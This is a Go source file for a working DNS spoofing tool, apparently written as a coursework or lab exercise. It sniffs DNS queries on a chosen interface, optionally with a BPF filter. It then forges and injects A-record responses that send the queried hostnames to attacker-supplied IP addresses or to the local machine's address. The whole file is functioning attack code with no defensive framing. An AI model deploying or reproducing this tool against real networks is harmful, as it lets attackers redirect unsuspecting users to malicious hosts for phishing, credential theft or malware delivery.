package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func main() {
	parameters := os.Args[1:]

	//Reading arguments
	var dnspoisonInterface string = ""
	var dnspoisonFile string = ""
	var dnspoisonBPF string = ""
	for i := 0; i < len(parameters); {
		if parameters[i] == "-i" {
			dnspoisonInterface = parameters[i+1]
			i = i + 2
		} else if parameters[i] == "-f" {
			dnspoisonFile = parameters[i+1]
			i = i + 2
		} else {
			if dnspoisonBPF == "" {
				dnspoisonBPF = parameters[i]
			} else {
				dnspoisonBPF = dnspoisonBPF + " " + parameters[i]
			}
			i++
		}
	}

	if dnspoisonInterface == "" {
		devices, err := pcap.FindAllDevs()
		if err != nil {
			fmt.Println("Error while reading default interface. Exiting")
			os.Exit(3)
		}
		dnspoisonInterface = strings.TrimSpace(devices[0].Name)
	}

	var defaultIPAddr string = ""
	var iperr error
	defaultIPAddr, iperr = Ipv4Addrdefault(dnspoisonInterface)
	if iperr != nil {
		fmt.Println(iperr)
		os.Exit(3)
	}
	var hostnamesMap map[string]string
	if dnspoisonFile != "" {
		var fileError error
		// myHandler, fileError = pcap.OpenOffline(dnspoisonFile)
		f, fileError := os.Open(dnspoisonFile)

		if fileError != nil {
			fmt.Println("Error while opening file " + fileError.Error())
			os.Exit(3)
		}

		defer f.Close()
		scanner := bufio.NewScanner(f)

		hostnamesMap = make(map[string]string)
		for scanner.Scan() {
			splitLine := strings.Fields(scanner.Text())
			hostnamesMap[splitLine[1]] = splitLine[0]
			fmt.Println(scanner.Text())
		}

		if err := scanner.Err(); err != nil {
			fmt.Println("Error while scanning hostname file " + dnspoisonFile + ". Exiting")
			os.Exit(3)
		}
	}

	var myHandler *pcap.Handle
	var captureError error
	myHandler, captureError = pcap.OpenLive(dnspoisonInterface, 65535, true, pcap.BlockForever)
	if captureError != nil {
		fmt.Println("Error while capturing from interface " + dnspoisonInterface + ". Exiting")
		os.Exit(3)
	}
	defer myHandler.Close()

	//setting BPF filter
	if dnspoisonBPF == "" {
		dnspoisonBPF += "udp dst port 53"
	} else {
		dnspoisonBPF += " and udp dst port 53"
	}
	var bpfError error = myHandler.SetBPFFilter(dnspoisonBPF)

	if bpfError != nil {
		fmt.Println("Error while setting BPF filter " + dnspoisonBPF + ". Exiting")
		os.Exit(3)
	}

	fmt.Println("Interface: " + dnspoisonInterface)
	fmt.Println("File: " + dnspoisonFile)
	fmt.Println("DefaultIP: " + defaultIPAddr)
	fmt.Println("BPF: " + dnspoisonBPF)

	var (
		questionL layers.DNSQuestion
		answerL   layers.DNSResourceRecord
		ethL      layers.Ethernet
		ipv4L     layers.IPv4
		udpL      layers.UDP
		dnsL      layers.DNS
	)

	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethL, &ipv4L, &udpL, &dnsL)

	// this slick will hold the names of the layers successfully decoded
	decodedLayers := make([]gopacket.LayerType, 0, 4)

	// pre-create the response with most of the data filled out
	answerL.Type = layers.DNSTypeA
	answerL.Class = layers.DNSClassIN
	answerL.TTL = 1000

	// create a buffer for writing output packet
	outputbuf := gopacket.NewSerializeBuffer()

	// set the arguments for serialization
	serializeOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// pre-allocate loop counter
	var i uint16

	// swap storage for ip and udp fields
	var ipv4Address net.IP
	var udpP layers.UDPPort
	var ethernetMac net.HardwareAddr

	//Reading packets
	filePackets := gopacket.NewPacketSource(myHandler, myHandler.LinkType())

	//Iterating over the packets
	for packet := range filePackets.Packets() {
		// decode this packet using the fast decoder
		var err error
		err = decoder.DecodeLayers(packet.Data(), &decodedLayers)
		if err != nil {
			fmt.Println("Decoding error!", err)
			continue
		}

		// only proceed if all layers decoded
		if len(decodedLayers) != 4 {
			fmt.Println("Not enough layers!")
			continue
		}

		// check that this is not a response
		if dnsL.QR {
			continue
		}
		// swap ethernet macs
		ethernetMac = ethL.SrcMAC
		ethL.SrcMAC = ethL.DstMAC
		ethL.DstMAC = ethernetMac

		// swap the ip
		ipv4Address = ipv4L.SrcIP
		ipv4L.SrcIP = ipv4L.DstIP
		ipv4L.DstIP = ipv4Address

		// swap the udp ports
		udpP = udpL.SrcPort
		udpL.SrcPort = udpL.DstPort
		udpL.DstPort = udpP

		// set this to be a response
		dnsL.QR = true

		// if recursion was requested, it is available
		if dnsL.RD {
			dnsL.RA = true
		}
		var check bool = false
		// for each question
		for i = 0; i < dnsL.QDCount; i++ {

			// get the question
			questionL = dnsL.Questions[i]

			// verify this is an A-IN record question
			if questionL.Type != layers.DNSTypeA || questionL.Class != layers.DNSClassIN {
				continue
			}

			// copy the name across to the response
			answerL.Name = questionL.Name

			if dnspoisonFile != "" {
				ipaddrValue, ok := hostnamesMap[strings.TrimSpace(string(questionL.Name))]
				if ok {
					check = true
					answerL.IP = net.ParseIP(strings.TrimSpace(ipaddrValue))
				} else {
					answerL.IP = net.ParseIP(defaultIPAddr)
				}
			} else {
				check = true
				answerL.IP = net.ParseIP(defaultIPAddr)
			}
			// append the answer to the original query packet
			dnsL.Answers = append(dnsL.Answers, answerL)
			dnsL.ANCount = dnsL.ANCount + 1
		}
		if !check {
			continue
		}
		// set the UDP to be checksummed by the IP layer
		err = udpL.SetNetworkLayerForChecksum(&ipv4L)
		if err != nil {
			panic(err)
		}

		// serialize packets
		err = gopacket.SerializeLayers(outputbuf, serializeOpts, &ethL, &ipv4L, &udpL, &dnsL)
		if err != nil {
			panic(err)
		}

		// write packet
		err = myHandler.WritePacketData(outputbuf.Bytes())
		if err != nil {
			panic(err)
		}

		fmt.Println("Spoofed packet sent for TXID 0x" + strconv.FormatUint(uint64(dnsL.ID), 16))
	}

}

func Ipv4Addrdefault(interfaceName string) (addr string, err error) {
	var (
		ief      *net.Interface
		addrs    []net.Addr
		ipv4Addr net.IP
	)
	if ief, err = net.InterfaceByName(interfaceName); err != nil { // get interface
		return
	}
	if addrs, err = ief.Addrs(); err != nil { // get addresses
		return
	}
	for _, addr := range addrs { // get ipv4 address
		if ipv4Addr = addr.(*net.IPNet).IP.To4(); ipv4Addr != nil {
			break
		}
	}
	if ipv4Addr == nil {
		fmt.Println("interface ", interfaceName, " don't have an ipv4 address")
		return "", nil
	}
	return ipv4Addr.String(), nil
}
